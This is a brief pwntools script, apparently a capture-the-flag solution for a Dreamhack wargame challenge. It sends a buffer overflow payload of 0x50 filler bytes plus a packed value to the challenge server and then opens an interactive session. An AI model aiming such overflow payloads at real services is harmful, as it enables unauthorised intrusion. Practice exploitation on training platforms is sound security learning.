from pwn import *

p = remote('host3.dreamhack.games', 19747)

payload = b'A' * 0x50 + p64(1)
p.sendafter(b'Input: ', payload)

p.interactive()
